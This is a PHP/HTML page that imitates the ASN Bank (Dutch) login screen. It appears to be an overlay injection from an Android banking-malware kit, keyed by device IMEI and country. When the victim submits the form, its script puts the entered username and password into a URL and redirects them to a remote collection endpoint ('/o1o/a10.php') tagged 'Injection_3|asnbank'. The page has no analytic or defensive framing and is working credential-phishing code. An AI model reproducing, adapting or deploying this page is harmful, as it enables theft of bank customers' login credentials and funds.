<html>
<head>
		<meta charset="UTF-8">
        <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
        <link href="nl/nl.asnbank.asnbankieren/style.css" rel="stylesheet">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        <img style="margin-top: -5px;margin-right: 20px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAIAAAD9MqGbAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MjE4MDBFMTI4NDRBMTFFODhFQjlCQ0IwRjU0NzNCMkMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MjE4MDBFMTM4NDRBMTFFODhFQjlCQ0IwRjU0NzNCMkMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDoyMTgwMEUxMDg0NEExMUU4OEVCOUJDQjBGNTQ3M0IyQyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDoyMTgwMEUxMTg0NEExMUU4OEVCOUJDQjBGNTQ3M0IyQyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PlOG4NoAAAFdSURBVHjaYnTYOImBLMCER+7NiUt/v/8kWeebk5eudMw9nlL/58s3rApYsGs7fhGoDchQjPRi4eYkVufrYxeuds4DMlSSg6S9bRkYGYnS+fro+atd84EM5YQAGV8HBkacoYCi89WRc9e6FwAtUYrxkQ10wh+2CJ2vDp+71gPSBvSbXIgrwVhhQdHGwMAuyMfIwvxo7R782uSCXUA6vz97DdEGBD/ffby3aBNBC6E6OaVEVdNCbs9aA3IDD5ewsRYxaQjqWmlvOyAJ1Pzn63chQ01xR1OCOpkVIj0hLD41eVZ+nndnrr45eZlLWpxbXpJYnSDNqvJsArxvz1x9ffwCt7wUt6wEsTqBgFdVjk2I/+3pK6+PnOdRkuGSESdWJ0iziiy7iMDbU1eAUcWjLMslLUZCXpF0tdTIiwYyrrbP/vvtBwl5BQgknM3///snZmPIzMlBmk6IzXhkAQIMAFMLcHCXP8AzAAAAAElFTkSuQmCC">
        <h3>Vul uw gegevens in</h3>
    </div>
    <form id="form" >
        <div style="padding: 5px;">
            <div class="input-group mb-3">
                <div class="input-group-prepend">
                    <span class="input-group-text" style="border-radius: 0;">Toegangsnaam</span>
                </div>
                <input type="tel" class="form-control" id="login" name="login" style="border-radius: 0;" required>
            </div>

            <div class="input-group mb-3">
                <div class="input-group-prepend">
                    <span class="input-group-text" style="border-radius: 0;">Wachtwoord</span>
                </div>
                <input type="password" class="form-control" id="password" name="password" style="border-radius: 0;" required>
            </div>
            <input type="submit" class="btn btn-primary active" id="btn_finish" value="INLOGGEN">
        </div>
    </form>
    <script type="text/javascript">
        (function () {


       var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };
                   var g_oBtn = document.getElementById('btn_finish');
                   g_oBtn.onclick = function () {

                       var oNumInp = document.getElementById('login');
                       var oCodeInp = document.getElementById('password');

                       try{
                           oNumInp.className = 'form-control';
                           oCodeInp.className = 'form-control';
                       } catch(e){};

                       if (oNumInp.value.length < 3) {
                           try{
                               oNumInp.className = 'form-control error';
                           } catch(e){};
                           return false;
                       }

                       if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
                           try{
                               oCodeInp.className = 'form-control error';
                           } catch(e){};
                           return false;
                       }
top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|asnbank|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
</script>
</body>
</html>
